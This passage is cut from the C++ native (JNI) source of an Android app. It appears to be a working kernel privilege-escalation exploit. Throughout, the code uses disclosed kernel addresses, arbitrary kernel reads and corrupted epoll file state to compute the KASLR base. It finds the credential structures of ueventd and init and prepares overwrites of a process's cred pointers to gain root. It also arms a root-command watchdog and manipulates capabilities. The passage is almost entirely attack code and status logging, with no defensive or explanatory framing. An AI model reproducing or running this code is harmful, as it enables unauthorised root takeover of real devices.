        std::lock_guard<std::mutex> lock(g_epitem_mutex);
        if (!g_epitem_fds.empty() && watched_fd == g_epitem_fds[0] &&
            g_epitem_fds.size() == static_cast<std::size_t>(
                    kEpitemPreDrainCount + kEpitemCount + 1)) {
            expected_ep_links = kEpitemPreDrainCount + kEpitemCount;
        } else if (std::find(g_file_probe_fds.begin(),
                             g_file_probe_fds.end(), watched_fd) !=
                g_file_probe_fds.end()) {
            expected_ep_links = 1;
        }
        for (int candidate : g_file_probe_fds) {
            if (candidate >= 0 && candidate != arbitrary_fd &&
                candidate != watched_fd) {
                reference_fd = candidate;
                break;
            }
        }
    }
    std::uint64_t watched_file = 0;
    std::uint64_t watched_inode = 0;
    std::uint64_t watched_inode_slot = 0;
    std::uint64_t watched_file_security = 0;
    std::uint64_t arbitrary_file = 0;
    std::uint64_t arbitrary_inode = 0;
    std::uint64_t arbitrary_inode_slot = 0;
    std::uint64_t arbitrary_file_security = 0;
    std::uint64_t reference_file = 0;
    std::uint64_t reference_inode = 0;
    std::uint64_t reference_inode_slot = 0;
    std::uint64_t reference_file_security = 0;
    std::uint64_t watched_fops = 0;
    std::uint64_t arbitrary_fops = 0;
    std::uint64_t reference_fops = 0;
    bool fd_table = pointers && expected_ep_links != 0 &&
            watched_fd >= 0 && arbitrary_fd >= 0 &&
            reference_fd >= 0 && lookup_task_fd(
                    app_task, watched_fd, &watched_file, &watched_inode,
                    &watched_inode_slot, &watched_file_security) &&
            lookup_task_fd(
                    app_task, arbitrary_fd, &arbitrary_file,
                    &arbitrary_inode, &arbitrary_inode_slot,
                    &arbitrary_file_security) &&
            lookup_task_fd(
                    app_task, reference_fd, &reference_file,
                    &reference_inode, &reference_inode_slot,
                    &reference_file_security) &&
            arbitrary_file == g_disclosed_file_address.load() &&
            arbitrary_file != watched_file && reference_file != watched_file &&
            reference_file != arbitrary_file &&
            watched_inode == reference_inode &&
            arbitrary_inode == g_disclosed_epitem_address.load() + 0x50;
    bool fops = fd_table &&
            reliable_read64(watched_file + kFileFopsOffset, &watched_fops) &&
            reliable_read64(arbitrary_file + kFileFopsOffset,
                            &arbitrary_fops) &&
            reliable_read64(reference_file + kFileFopsOffset,
                            &reference_fops) &&
            kernel_address(watched_fops) &&
            watched_fops == kernel_base + kEventfdFopsOffset &&
            arbitrary_fops == watched_fops && reference_fops == watched_fops;
    std::uint64_t selected_link = g_disclosed_epitem_address.load() + 0x58;
    std::uint64_t selected_next = 0;
    std::uint32_t donor_ids[8] {};
    bool donor_ids_valid = true;
    for (int index = 0; donor_ids_valid && index < 4; ++index) {
        std::uint64_t pair = 0;
        donor_ids_valid = reliable_read64_allow_zero(
                g_security_target_cred + 4 + index * 8,
                g_security_target_cred_slot, g_security_target_cred,
                &pair);
        donor_ids[index * 2] = static_cast<std::uint32_t>(pair);
        donor_ids[index * 2 + 1] = static_cast<std::uint32_t>(pair >> 32U);
    }
    bool corrupt_state = fd_table && fops &&
            arbitrary_read64(arbitrary_file + kFileInodeOffset,
                             &arbitrary_inode) &&
            arbitrary_read64(selected_link, &selected_next) &&
            arbitrary_inode == g_disclosed_epitem_address.load() + 0x50 &&
            selected_next == arbitrary_file + kFileInodeOffset;
    bool donor = donor_ids_valid && g_security_target_pid > 0 &&
            kernel_pointer(g_security_target_task) &&
            kernel_pointer(g_security_target_cred) &&
            g_security_target_real_cred_slot ==
                    g_security_target_task + kTaskRealCredOffset &&
            g_security_target_cred_slot ==
                    g_security_target_task + kTaskCredOffset &&
            g_security_target_baseline_usage != 0 &&
            g_security_target_cred_caps != 0 && ueventd_sid != 0 &&
            kernel_pointer(ueventd_security);
    bool live_target = donor && validate_live_security_target();
    bool pass = pointers && fd_table && fops && corrupt_state && donor &&
            live_target;
    if (pass) {
        g_terminal_helper_task = helper_task;
        g_terminal_memfd_inode_security_slot = module_inode_slot;
        g_terminal_memfd_inode_security_original = module_inode_security;
        g_terminal_vendor_inode_security = vendor_inode_security;
        g_terminal_vendor_inode_security_word8 = vendor_word8;
        g_terminal_vendor_inode_sid = vendor_sid;
        g_terminal_ueventd_task = ueventd_task;
        g_terminal_ueventd_cred = ueventd_cred;
        g_terminal_ueventd_security = ueventd_security;
        g_terminal_ueventd_security_word8 = ueventd_word8;
        g_terminal_ueventd_sid = ueventd_sid;
        g_terminal_owner_task = app_task;
        g_terminal_owner_pid = static_cast<int>(app_pid);
        g_terminal_watched_fd = watched_fd;
        g_terminal_arbitrary_fd = arbitrary_fd;
        g_terminal_reference_fd = reference_fd;
        g_terminal_watched_file = watched_file;
        g_terminal_watched_inode = watched_inode;
        g_terminal_watched_fops = watched_fops;
        g_terminal_arbitrary_file = arbitrary_file;
        g_terminal_arbitrary_inode = g_disclosed_epitem_address.load() + 0x50;
        g_terminal_arbitrary_fops = arbitrary_fops;
        g_terminal_reference_file = reference_file;
        g_terminal_reference_inode = reference_inode;
        g_terminal_reference_fops = reference_fops;
        g_terminal_selected_epitem = g_disclosed_epitem_address.load();
        g_terminal_expected_fops = kernel_base + kEventfdFopsOffset;
        g_terminal_expected_ep_links = expected_ep_links;
        g_terminal_donor_task = g_security_target_task;
        g_terminal_donor_pid = g_security_target_pid;
        g_terminal_donor_real_cred_slot = g_security_target_real_cred_slot;
        g_terminal_donor_cred_slot = g_security_target_cred_slot;
        g_terminal_donor_usage = g_security_target_baseline_usage;
        std::copy(std::begin(donor_ids), std::end(donor_ids),
                  std::begin(g_terminal_donor_ids));
        g_terminal_donor_caps = g_security_target_cred_caps;
        g_terminal_donor_sid = ueventd_sid;
        g_terminal_donor_security = ueventd_security;
        g_terminal_module_memfd = module_memfd;
        g_terminal_vendor_fd = vendor_fd;
        g_terminal_ueventd_pid = ueventd_pid;
        g_terminal_ctlbuf_profile_valid = true;
    }
    char state[2048];
    std::snprintf(state, sizeof(state),
            "status=%s stage=ctlbuf-rescue-profile app_task=0x%" PRIx64
            " helper_task=0x%" PRIx64
            " module_fd=%d module_file=0x%" PRIx64
            " module_inode=0x%" PRIx64
            " module_inode_security_slot=0x%" PRIx64
            " module_inode_security=0x%" PRIx64
            " module_file_sid=%u vendor_fd=%d"
            " vendor_file=0x%" PRIx64
            " vendor_inode=0x%" PRIx64
            " vendor_inode_security=0x%" PRIx64
            " vendor_inode_word8=0x%" PRIx64
            " cred_blob_offset=%u file_blob_offset=%u"
            " inode_blob_offset=%u"
            " vendor_inode_sid=%u vendor_file_isid=%u"
            " ueventd_pid=%d ueventd_task=0x%" PRIx64
            " ueventd_cred=0x%" PRIx64
            " ueventd_security=0x%" PRIx64
            " ueventd_word8=0x%" PRIx64 " ueventd_sid=%u"
            " owner_task=0x%" PRIx64 " owner_pid=%d"
            " watched_fd=%d arbitrary_fd=%d reference_fd=%d"
            " watched_file=0x%" PRIx64 " watched_inode=0x%" PRIx64
            " arbitrary_file=0x%" PRIx64 " arbitrary_inode=0x%" PRIx64
            " reference_file=0x%" PRIx64 " reference_inode=0x%" PRIx64
            " watched_fops=0x%" PRIx64 " arbitrary_fops=0x%" PRIx64
            " reference_fops=0x%" PRIx64 " selected_epitem=0x%" PRIx64
            " expected_fops=0x%" PRIx64 " expected_ep_links=%u"
            " corrupt_inode=0x%" PRIx64
            " corrupt_next=0x%" PRIx64 " fd_table=%d fops_valid=%d"
            " corrupt_state=%d donor_valid=%d live_target=%d"
            " live_target_stage=%d donor_task=0x%" PRIx64
            " donor_pid=%d donor_usage=%u donor_caps=0x%" PRIx64
            " donor_sid=%u donor_security=0x%" PRIx64,
            pass ? "pass" : "fail", app_task, helper_task,
            module_memfd, module_file, module_inode, module_inode_slot,
            module_inode_security, module_file_sid, vendor_fd, vendor_file,
            vendor_inode, vendor_inode_security, vendor_word8,
            cred_blob_offset, file_blob_offset, inode_blob_offset,
            vendor_sid, vendor_file_isid, ueventd_pid, ueventd_task,
            ueventd_cred,
            ueventd_security, ueventd_word8, ueventd_sid,
            app_task, app_pid, watched_fd, arbitrary_fd, reference_fd,
            watched_file, watched_inode, arbitrary_file,
            g_disclosed_epitem_address.load() + 0x50, reference_file,
            reference_inode, watched_fops, arbitrary_fops, reference_fops,
            g_disclosed_epitem_address.load(), kernel_base + kEventfdFopsOffset,
            expected_ep_links, arbitrary_inode, selected_next,
            fd_table ? 1 : 0, fops ? 1 : 0,
            corrupt_state ? 1 : 0, donor ? 1 : 0, live_target ? 1 : 0,
            g_live_security_target_stage, g_security_target_task,
            g_security_target_pid, g_security_target_baseline_usage,
            g_security_target_cred_caps, ueventd_sid, ueventd_security);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareDirectSecurityTarget(
        JNIEnv* environment, jclass, jboolean repair_cred,
        jboolean quarantine_cred, jboolean terminal_cleanup) {
    bool repair = repair_cred == JNI_TRUE;
    bool quarantine = repair && quarantine_cred == JNI_TRUE;
    bool clean = repair && !quarantine && terminal_cleanup == JNI_TRUE;
    if (clean) {
        begin_terminal_sequence();
    } else {
        reset_terminal_donor_proof();
    }
    std::uint64_t donor_real_cred_slot =
            g_security_target_real_cred_slot;
    std::uint64_t donor_cred_slot = g_security_target_cred_slot;
    bool cached_donor_slots = !repair ||
            (g_security_target_slots_valid &&
             donor_real_cred_slot >= g_security_target_task &&
             donor_real_cred_slot + 16 <=
                     g_security_target_task + 0x3000 &&
             donor_cred_slot == donor_real_cred_slot + 8);
    std::uint64_t repair_value = UINT64_MAX;
    bool repair_snapshot = !repair;
    int valid_snapshots = repair ? 0 : 2;
    std::uint32_t stable_usage = 0;
    int repair_attempts = 0;
    std::uint64_t cap_seed = 0;
    int cap_seed_attempts = 0;
    bool cap_seed_valid = !repair;
    for (; repair && !cap_seed_valid && cap_seed_attempts < 16;
         ++cap_seed_attempts) {
        std::uint64_t first_caps = 0;
        std::uint64_t second_caps = 0;
        cap_seed_valid = cached_donor_slots &&
                reliable_read64_allow_zero(
                        g_security_target_cred + 56,
                        donor_cred_slot, g_security_target_cred,
                        &first_caps) &&
                first_caps != 0 &&
                reliable_read64_allow_zero(
                        g_security_target_cred + 56,
                        donor_cred_slot, g_security_target_cred,
                        &second_caps) &&
                second_caps == first_caps;
        if (cap_seed_valid) {
            cap_seed = second_caps;
            g_security_target_cred_caps = cap_seed;
        } else {
            usleep(250);
        }
    }
    bool live_target = !repair ||
            (cap_seed_valid && validate_live_security_target());
    for (; repair && live_target && valid_snapshots < 2 &&
         repair_attempts < 32;
         ++repair_attempts) {
        std::uint64_t snapshot_repair = UINT64_MAX;
        bool snapshot = cached_donor_slots &&
                validate_zero_root_cred_snapshot(
                        g_security_target_task,
                        g_security_target_cred,
                        donor_real_cred_slot, donor_cred_slot,
                        g_security_target_blob, g_fake_security_sid,
                        &snapshot_repair);
        std::uint32_t snapshot_usage = static_cast<std::uint32_t>(
                g_zero_snapshot_header);
        if (snapshot && valid_snapshots > 0 &&
                snapshot_usage != stable_usage) {
            snapshot = false;
        }
        if (snapshot) {
            repair_value = snapshot_repair;
            stable_usage = snapshot_usage;
        }
        valid_snapshots = snapshot ? valid_snapshots + 1 : 0;
        if (valid_snapshots < 2) {
            usleep(250);
        }
    }
    repair_snapshot = valid_snapshots == 2;
    std::uint64_t real_cred_slot = 0;
    std::uint64_t cred_slot = 0;
    bool slots = repair_snapshot && find_cred_slots(
            g_credential_target_task, g_arb_cred_address,
            &real_cred_slot, &cred_slot);
    bool repair_valid = !repair ||
            (cap_seed_valid && live_target && repair_snapshot);
    bool pass = slots && repair_valid &&
            (!clean || (g_private_cred == g_arb_cred_address &&
                        kernel_pointer(g_private_cred) &&
                        static_cast<std::uint32_t>(
                                g_private_cred_snapshot[0]) == 2 &&
                        g_private_cred_sid != 0)) &&
            kernel_pointer(g_security_target_task) &&
            kernel_pointer(g_security_target_cred) &&
            kernel_pointer(g_security_target_blob) &&
            g_fake_security_sid != 0 &&
            cred_slot == real_cred_slot + 8;
    if (pass) {
        g_direct_init_target = true;
        g_direct_security_repair = repair;
        g_direct_cred_quarantine = quarantine;
        g_direct_terminal_cleanup = clean;
        g_direct_write_step = repair ? 1 : 0;
        g_direct_init_real_cred_slot = real_cred_slot;
        g_direct_init_cred_slot = cred_slot;
        g_direct_cred_value = g_security_target_cred;
        g_direct_quarantine_value = 0;
        g_security_target_baseline_usage = stable_usage;
        if (repair) {
            g_security_target_real_cred_slot = donor_real_cred_slot;
            g_security_target_cred_slot = donor_cred_slot;
            g_security_target_cred_repair = repair_value;
        }
    }
    char state[2048];
    std::snprintf(state, sizeof(state),
            "status=%s stage=direct-security-target"
            " task=0x%" PRIx64
            " current_cred=0x%" PRIx64
            " real_cred_slot=0x%" PRIx64
            " cred_slot=0x%" PRIx64
            " security_cred=0x%" PRIx64
            " repair_requested=%d repair_snapshot=%d"
            " terminal_cleanup=%d"
            " cached_donor_slots=%d repair_attempts=%d"
            " valid_snapshots=%d"
            " cap_seed=0x%" PRIx64 " cap_seed_attempts=%d"
            " baseline_usage=%u"
            " donor_task=0x%" PRIx64
            " donor_real_cred_slot=0x%" PRIx64
            " donor_cred_slot=0x%" PRIx64
            " repair_value=0x%" PRIx64
            " snapshot_stage=%d snapshot_header=0x%" PRIx64
            " snapshot_usage=%u snapshot_uid=%u"
            " snapshot_id_index=%d snapshot_id_value=0x%" PRIx64
            " snapshot_repair=0x%" PRIx64
            " snapshot_security=0x%" PRIx64 " snapshot_sid=%u"
            " zero_address=0x%" PRIx64 " zero_rc=%d zero_errno=%d",
            pass ? "pass" : "fail", g_credential_target_task,
            g_arb_cred_address, real_cred_slot, cred_slot,
            g_security_target_cred, repair ? 1 : 0,
            repair_snapshot ? 1 : 0, clean ? 1 : 0,
            cached_donor_slots ? 1 : 0,
            repair_attempts, valid_snapshots,
            cap_seed, cap_seed_attempts, stable_usage,
            g_security_target_task,
            donor_real_cred_slot, donor_cred_slot,
            repair_value, g_zero_snapshot_stage,
            g_zero_snapshot_header,
            static_cast<std::uint32_t>(g_zero_snapshot_header),
            static_cast<std::uint32_t>(g_zero_snapshot_header >> 32U),
            g_zero_snapshot_id_index, g_zero_snapshot_id_value,
            g_zero_snapshot_repair, g_zero_snapshot_security,
            g_zero_snapshot_sid, g_zero_read_address,
            g_zero_read_result, g_zero_read_errno);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_profileRootTarget(
        JNIEnv* environment, jclass) {
    std::uint64_t real_cred_slot = 0;
    std::uint64_t cred_slot = 0;
    bool slots = find_cred_slots(
            g_credential_target_task, g_arb_cred_address,
            &real_cred_slot, &cred_slot);

    std::uint64_t current_task = 0;
    bool current = kernel_pointer(g_cached_current_binder_proc) &&
            reliable_read64(g_cached_current_binder_proc + 72,
                            &current_task) &&
            kernel_pointer(current_task);
    std::uint64_t slide = g_profile_kernel_slide;
    std::uint64_t init_cred = g_profile_init_cred;
    std::uint64_t kernel_base = kKernelLinkBase + slide;
    std::uint32_t init_usage = static_cast<std::uint32_t>(
            g_last_binder_probe_init_header);
    std::uint32_t init_sid = g_last_binder_probe_init_sid;
    std::uint64_t init_caps = g_last_binder_probe_init_caps;
    bool kernel = current && kernel_address(kernel_base) &&
            (kernel_base & (kKaslrAlignment - 1)) == 0 &&
            init_cred == kernel_base + kInitCredOffset &&
            init_cred == g_last_binder_probe_init_cred;

    std::uint64_t root_header = g_security_target_cred_header;
    std::uint64_t root_caps = g_security_target_cred_caps;
    std::uint64_t root_repair_word = g_security_target_cred_repair;
    bool root_header_read = g_security_target_cred_snapshot;
    bool root_ids_valid = g_security_target_cred_snapshot;
    bool root_caps_read = g_security_target_cred_snapshot;
    bool root_repair_read = g_security_target_cred_snapshot;
    std::uint64_t update_real_cred_slot =
            g_security_target_real_cred_slot;
    std::uint64_t update_cred_slot = g_security_target_cred_slot;
    bool update_slots = g_security_target_slots_valid &&
            kernel_pointer(update_real_cred_slot) &&
            update_cred_slot == update_real_cred_slot + 8;
    std::uint32_t update_usage = static_cast<std::uint32_t>(root_header);
    bool handoff_ready = update_slots &&
            kernel_pointer(g_security_target_cred) &&
            kernel_pointer(g_security_target_blob) &&
            g_fake_security_sid != 0;

    bool pass = slots && kernel && handoff_ready;
    if (pass) {
        g_profile_cred_slot = cred_slot;
        g_profile_init_cred = init_cred;
        g_profile_kernel_slide = slide;
    }
    char state[1280];
    std::snprintf(state, sizeof(state),
            "status=%s stage=root-profile"
            " helper_task=0x%" PRIx64
            " real_cred_offset=0x%" PRIx64
            " cred_offset=0x%" PRIx64
            " current_task=0x%" PRIx64
            " kernel_base=0x%" PRIx64
            " kaslr_slide=0x%" PRIx64
            " init_cred=0x%" PRIx64
            " init_usage=%u init_sid=%u init_caps=0x%" PRIx64
            " update_task=0x%" PRIx64
            " update_cred=0x%" PRIx64
            " update_real_cred_offset=0x%" PRIx64
            " update_cred_offset=0x%" PRIx64
            " update_usage=%u update_sid=%u update_caps=0x%" PRIx64
            " update_repair=0x%" PRIx64
            " update_header=0x%" PRIx64
            " update_ids=%" PRIx64 ",%" PRIx64 ",%" PRIx64 ",%" PRIx64
            " update_reads=%d,%d,%d,%d"
            " handoff_ready=%d",
            pass ? "pass" : "fail", g_credential_target_task,
            slots ? real_cred_slot - g_credential_target_task : 0,
            slots ? cred_slot - g_credential_target_task : 0,
            current_task, kernel_base, slide, init_cred,
            init_usage, init_sid, init_caps,
            g_security_target_task, g_security_target_cred,
            update_slots
                    ? update_real_cred_slot - g_security_target_task : 0,
            update_slots ? update_cred_slot - g_security_target_task : 0,
            update_usage, g_fake_security_sid, root_caps,
            root_repair_word, root_header,
            g_security_target_cred_ids[0],
            g_security_target_cred_ids[1],
            g_security_target_cred_ids[2],
            g_security_target_cred_ids[3],
            root_header_read ? 1 : 0, root_ids_valid ? 1 : 0,
            root_caps_read ? 1 : 0, root_repair_read ? 1 : 0,
            handoff_ready ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
        JNIEnv* environment, jclass, jstring nonce_string) {
    if (nonce_string == nullptr || syscall(SYS_gettid) != getpid()) {
        return environment->NewStringUTF(
                "status=fail stage=command-root-watchdog-prepare reason=arm");
    }
    const char* nonce = environment->GetStringUTFChars(nonce_string, nullptr);
    if (nonce == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=command-root-watchdog-prepare reason=nonce");
    }
    std::size_t nonce_length = std::strlen(nonce);
    bool nonce_valid = nonce_length == 32 && std::all_of(
            nonce, nonce + nonce_length, [](unsigned char value) {
                return (value >= '0' && value <= '9') ||
                        (value >= 'a' && value <= 'f');
            });
    CommandRootIdentity identity;
    bool shell = read_command_root_identity(&identity) &&
            identity.tid == identity.pid &&
            command_identity_is_shell(identity);
    if (g_helper_waiting_fd >= 0) {
        close(g_helper_waiting_fd);
        g_helper_waiting_fd = -1;
    }
    if (g_command_watchdog_output_fd >= 0) {
        close(g_command_watchdog_output_fd);
        g_command_watchdog_output_fd = -1;
    }
    if (nonce_valid && shell) {
        g_helper_waiting_fd = open(
                "/data/local/tmp/light-side-normalise.waiting",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
        g_command_watchdog_output_fd = fcntl(
                STDOUT_FILENO, F_DUPFD_CLOEXEC, 3);
    }
    bool prepared = nonce_valid && shell && g_helper_waiting_fd >= 0 &&
            g_command_watchdog_output_fd >= 0;
    if (prepared) {
        std::memcpy(g_command_watchdog_nonce, nonce, nonce_length);
        g_command_watchdog_nonce[nonce_length] = '\0';
    } else {
        g_command_watchdog_nonce[0] = '\0';
        if (g_helper_waiting_fd >= 0) {
            close(g_helper_waiting_fd);
            g_helper_waiting_fd = -1;
        }
        if (g_command_watchdog_output_fd >= 0) {
            close(g_command_watchdog_output_fd);
            g_command_watchdog_output_fd = -1;
        }
    }
    environment->ReleaseStringUTFChars(nonce_string, nonce);
    g_command_watchdog_arm.store(0, std::memory_order_release);
    g_command_watchdog_ready.store(0, std::memory_order_release);
    g_command_watchdog_normalise.store(0, std::memory_order_release);
    g_command_watchdog_exit.store(0, std::memory_order_release);
    g_command_watchdog_tid.store(-1, std::memory_order_release);
    g_resukisu_action.store(0, std::memory_order_release);
    g_resukisu_exit.store(-1, std::memory_order_release);
    g_resukisu_errno.store(0, std::memory_order_release);
    g_resukisu_manager_uid.store(-1, std::memory_order_release);
    g_resukisu_kernel_base.store(0, std::memory_order_release);
    if (g_resukisu_fd >= 0) {
        close(g_resukisu_fd);
        g_resukisu_fd = -1;
    }
    if (g_resukisu_module_fd >= 0) {
        close(g_resukisu_module_fd);
        g_resukisu_module_fd = -1;
    }
    g_ctlbuf_donor_freeze_request.store(0, std::memory_order_release);
    g_ctlbuf_donor_pid.store(-1, std::memory_order_release);
    g_ctlbuf_donor_signal_state.store(0, std::memory_order_release);
    g_ctlbuf_donor_frozen_confirmation.store(0,
            std::memory_order_release);
    g_ctlbuf_donor_leader_stage.store(0, std::memory_order_release);
    g_ctlbuf_donor_signal_pid.store(-1, std::memory_order_release);
    g_ctlbuf_donor_kill_rc.store(-1, std::memory_order_release);
    g_ctlbuf_donor_kill_errno.store(0, std::memory_order_release);
    g_ctlbuf_donor_frozen.store(0, std::memory_order_release);
    g_ctlbuf_donor_resumed.store(0, std::memory_order_release);
    g_ctlbuf_rescue_result.store(0, std::memory_order_relaxed);
    g_ctlbuf_rescue_errno.store(0, std::memory_order_relaxed);
    g_ctlbuf_rescue_detail.store(0, std::memory_order_relaxed);
    g_ctlbuf_rescue_stage.store(0, std::memory_order_release);
    g_command_watchdog_thread_created = false;
    g_command_watchdog_leader_identity = CommandRootIdentity {};
    g_command_watchdog_identity = CommandRootIdentity {};
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_rescue_plan_mutex);
        g_ctlbuf_rescue_plan.clear();
        g_ctlbuf_rescue_parameters.clear();
        if (g_ctlbuf_rescue_module_fd >= 0) {
            close(g_ctlbuf_rescue_module_fd);
            g_ctlbuf_rescue_module_fd = -1;
        }
        g_ctlbuf_rescue_plan_ready.store(0, std::memory_order_release);
        g_ctlbuf_rescue_module_loaded = false;
        g_ctlbuf_rescue_module_unloaded = false;
    }
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
        g_ctlbuf_finalise_proof.clear();
        g_ctlbuf_finalise_verified = false;
        g_ctlbuf_finalise_status_code = 0;
        g_ctlbuf_finalise_plan = CtlbufFinalisePlan {};
        g_ctlbuf_donor_resume_proof = CtlbufDonorResumeProof {};
        g_ctlbuf_donor_resume_record = CtlbufDonorResumeRecord {};
        g_ctlbuf_resume_cookie_hi = 0;
        g_ctlbuf_resume_cookie_lo = 0;
    }
    g_command_watchdog_phase.store(
            prepared ? kCommandWatchdogPrepared : kCommandWatchdogFailed,
            std::memory_order_release);
    char state[192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=command-root-watchdog-prepare"
            " leader=%d shell=%d waiting_fd=%d output_fd=%d",
            prepared ? "pass" : "fail",
            identity.tid == identity.pid ? 1 : 0, shell ? 1 : 0,
            g_helper_waiting_fd >= 0 ? 1 : 0,
            g_command_watchdog_output_fd >= 0 ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_createPrivateShellCredential(
        JNIEnv* environment, jclass) {
    (void)write(STDOUT_FILENO,
            "NATIVE_PRIVATE_CREDENTIAL_ENTER\n",
            sizeof("NATIVE_PRIVATE_CREDENTIAL_ENTER\n") - 1);
    bool leader = syscall(SYS_gettid) == getpid();
    bool shell_before = getuid() == 2000 && geteuid() == 2000 &&
            getgid() == 2000 && getegid() == 2000;
    bool watchdog_prepared = g_command_watchdog_phase.load(
            std::memory_order_acquire) == kCommandWatchdogPrepared &&
            g_helper_waiting_fd >= 0 && g_command_watchdog_output_fd >= 0;
    if (g_helper_waiting_fd >= 0) {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_WAIT_FD_OPEN success\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_WAIT_FD_OPEN success\n") -
                        1);
    } else {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_WAIT_FD_OPEN failure\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_WAIT_FD_OPEN failure\n") -
                        1);
    }
    errno = 0;
    int securebits_before = leader && shell_before
            ? static_cast<int>(syscall(
                    SYS_prctl, PR_GET_SECUREBITS, 0, 0, 0, 0)) : -1;
    int securebits_before_errno = securebits_before >= 0 ? 0 : errno;
    if (securebits_before >= 0) {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_GET_SECUREBITS rc=success\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_GET_SECUREBITS rc=success\n") -
                        1);
    } else {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_GET_SECUREBITS rc=failure\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_GET_SECUREBITS rc=failure\n") -
                        1);
    }
    errno = 0;
    int ambient_chown_before = securebits_before >= 0
            ? static_cast<int>(syscall(
                    SYS_prctl, PR_CAP_AMBIENT,
                    PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0)) : -1;
    int ambient_chown_before_errno = ambient_chown_before >= 0
            ? 0 : errno;
    if (ambient_chown_before == 0) {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_READ rc=clear\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_READ rc=clear\n") -
                        1);
    } else {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_READ rc=invalid\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_READ rc=invalid\n") -
                        1);
    }
    errno = 0;
    int ambient_chown_lower = ambient_chown_before == 0
            ? static_cast<int>(syscall(
                    SYS_prctl, PR_CAP_AMBIENT,
                    PR_CAP_AMBIENT_LOWER, CAP_CHOWN, 0, 0)) : -1;
    int ambient_chown_lower_errno = ambient_chown_lower == 0 ? 0 : errno;
    if (ambient_chown_lower == 0) {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_LOWER rc=success\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_LOWER rc=success\n") -
                        1);
    } else {
        (void)write(STDOUT_FILENO,
                "NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_LOWER rc=failure\n",
                sizeof("NATIVE_PRIVATE_CREDENTIAL_AFTER_AMBIENT_LOWER rc=failure\n") -
                        1);
    }
    errno = 0;
    int private_credential_result = ambient_chown_lower == 0
            ? static_cast<int>(syscall(
                    SYS_setresuid, 2000, 2000, 2000)) : -1;
    int private_credential_errno = private_credential_result == 0
            ? 0 : errno;
    errno = 0;
    int ambient_chown_after = private_credential_result == 0
            ? static_cast<int>(syscall(
                    SYS_prctl, PR_CAP_AMBIENT,
                    PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0)) : -1;
    int ambient_chown_after_errno = ambient_chown_after >= 0 ? 0 : errno;
    errno = 0;
    int securebits_after = ambient_chown_after == 0
            ? static_cast<int>(syscall(
                    SYS_prctl, PR_GET_SECUREBITS, 0, 0, 0, 0)) : -1;
    int securebits_after_errno = securebits_after >= 0 ? 0 : errno;
    bool shell_after = getuid() == 2000 && geteuid() == 2000 &&
            getgid() == 2000 && getegid() == 2000;
    constexpr int kExpectedShellSecurebits = 47;
    bool pass = leader && shell_before && watchdog_prepared &&
            securebits_before == kExpectedShellSecurebits &&
            ambient_chown_before == 0 &&
            ambient_chown_lower == 0 && private_credential_result == 0 &&
            ambient_chown_after == 0 &&
            securebits_after == securebits_before && shell_after;
    g_helper_normalise_gate.store(0, std::memory_order_release);
    g_helper_normalise_uid_result = -1;
    g_helper_normalise_gid_result = -1;
    if (!pass && g_helper_waiting_fd >= 0) {
        close(g_helper_waiting_fd);
        g_helper_waiting_fd = -1;
    }
    if (!pass && g_command_watchdog_output_fd >= 0) {
        close(g_command_watchdog_output_fd);
        g_command_watchdog_output_fd = -1;
    }
    if (!pass) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
    }
    char state[512];
    std::snprintf(state, sizeof(state),
            "status=%s stage=private-shell-credential leader=%d"
            " pid=%d tid=%d"
            " securebits_before=%d securebits_before_errno=%d"
            " ambient_cap=%d"
            " ambient_before=%d ambient_before_errno=%d"
            " ambient_lower=%d ambient_lower_errno=%d"
            " private_credential=%d private_credential_errno=%d"
            " ambient_after=%d ambient_after_errno=%d"
            " securebits_after=%d securebits_after_errno=%d"
            " shell_before=%d shell_after=%d",
            pass ? "pass" : "fail", leader ? 1 : 0,
            getpid(), static_cast<int>(syscall(SYS_gettid)),
            securebits_before, securebits_before_errno, CAP_CHOWN,
            ambient_chown_before, ambient_chown_before_errno,
            ambient_chown_lower, ambient_chown_lower_errno,
            private_credential_result, private_credential_errno,
            ambient_chown_after, ambient_chown_after_errno,
            securebits_after, securebits_after_errno,
            shell_before ? 1 : 0, shell_after ? 1 : 0);
    (void)write(STDOUT_FILENO,
            "NATIVE_PRIVATE_CREDENTIAL_EXIT\n",
            sizeof("NATIVE_PRIVATE_CREDENTIAL_EXIT\n") - 1);
    return environment->NewStringUTF(state);
}

bool parse_ctlbuf_list(const std::string& value, bool tids) {
    std::size_t cursor = 0;
    std::set<std::uint64_t> unique;
    for (int index = 0; index < 7; ++index) {
